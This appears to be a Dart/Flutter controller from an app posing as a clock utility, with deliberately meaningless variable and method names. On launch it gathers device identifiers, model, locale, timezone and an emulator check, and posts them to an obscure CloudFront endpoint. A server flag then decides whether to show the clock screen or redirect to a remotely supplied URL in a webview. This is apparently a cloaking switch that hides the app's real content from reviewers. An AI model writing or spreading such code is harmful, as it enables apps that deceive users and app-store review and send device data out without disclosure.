import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class DayButlerMatrixLogic extends GetxController {

  var tjihfedy = RxBool(false);
  var galxebcjr = RxBool(true);
  var fdzg = RxString("");
  var dqwpg = RxBool(false);
  var aeipzo = RxBool(true);
  final brcvyekgxh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pelysb();
  }


  Future<void> pelysb() async {
    dqwpg.value = true;
    aeipzo.value = true;
    galxebcjr.value = false;

    brcvyekgxh.post("https://d3j207ms5prd7v.cloudfront.net/frjhcwpldgxkntumobsziveqay?no_check",data: await qdvfuyo()).then((value) {
      var imeljg = value.data["imeljg"] as String;
      var miouhj = value.data["miouhj"] as bool;
      if (miouhj) {
        fdzg.value = imeljg;
        wdujsmc();
      } else {
        rydsjvw();
      }
    }).catchError((e) {
      galxebcjr.value = true;
      aeipzo.value = true;
      dqwpg.value = false;
    });
  }

  Future<Map<String, dynamic>> qdvfuyo() async {
    final DeviceInfoPlugin hvqsr = DeviceInfoPlugin();
    PackageInfo muhqc_ojhmlitz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var wczyk = Platform.localeName;
    var mothk = currentTimeZone;

    var cvnl = muhqc_ojhmlitz.packageName;
    var vmhewzn = muhqc_ojhmlitz.version;
    var pondbc = muhqc_ojhmlitz.buildNumber;

    var fxzv = muhqc_ojhmlitz.appName;
    var shojl = "";
    var nkayouj  = "";
    var irtmbhx = "";
    var pxafu = "";
    var qsmpx = "";
    var vtns = "";
    var ieagfk = "";
    var czosyrp = "";
    var xcwkpo = "";
    var qnerutg = "";


    var ljfwxim = "";
    var kcbq = false;

    if (GetPlatform.isAndroid) {
      ljfwxim = "android";
      var vbrcdyqinx = await hvqsr.androidInfo;

      irtmbhx = vbrcdyqinx.brand;

      shojl  = vbrcdyqinx.model;
      nkayouj = vbrcdyqinx.id;

      kcbq = vbrcdyqinx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ljfwxim = "ios";
      var ydzjlo = await hvqsr.iosInfo;
      irtmbhx = ydzjlo.name;
      shojl = ydzjlo.model;

      nkayouj = ydzjlo.identifierForVendor ?? "";
      kcbq  = ydzjlo.isPhysicalDevice;
    }

    var res = {
      "fxzv": fxzv,
      "pondbc": pondbc,
      "vmhewzn": vmhewzn,
      "cvnl": cvnl,
      "shojl": shojl,
      "mothk": mothk,
      "irtmbhx": irtmbhx,
      "nkayouj": nkayouj,
      "wczyk": wczyk,
      "ljfwxim": ljfwxim,
      "kcbq": kcbq,
      "pxafu" : pxafu,
      "qsmpx" : qsmpx,
      "vtns" : vtns,
      "ieagfk" : ieagfk,
      "czosyrp" : czosyrp,
      "xcwkpo" : xcwkpo,
      "qnerutg" : qnerutg,

    };
    return res;
  }

  Future<void> rydsjvw() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> wdujsmc() async {
    Get.offNamed("/Outreload");
  }

}
